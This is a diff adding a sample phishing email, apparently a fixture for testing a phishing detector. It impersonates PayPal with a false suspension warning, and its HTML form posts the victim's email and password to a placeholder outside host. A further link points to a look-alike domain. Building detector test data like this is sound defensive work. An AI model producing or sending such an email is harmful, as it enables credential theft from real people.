@@ -1,0 +1,19 @@
+From: PayPal Security <paypal-security@hotmail.com>
+To: customer@example.com
+Subject: Action Required: Verify Your PayPal Account Immediately
+Date: Wed, 5 Apr 2026 08:30:00 +0000
+Authentication-Results: mx.example.com; spf=fail; dkim=fail
+Content-Type: text/html
+
+<html><body>
+<p>Dear PayPal customer,</p>
+<p>Your PayPal account has been suspended due to suspicious activity.</p>
+<p>Please verify your account immediately to restore access.</p>
+<form action="http://login.paypal.secure.verify-now.fake.net/login" method="post">
+  <input type="text" name="username" placeholder="Email"/>
+  <input type="password" name="password" placeholder="Password"/>
+  <button type="submit">Verify Account</button>
+</form>
+<p>Click here to verify: http://paypal.security.verify-now.phishlink.ru/confirm</p>
+<p>This is a limited time offer. Respond now or your account will be permanently suspended.</p>
+</body></html>
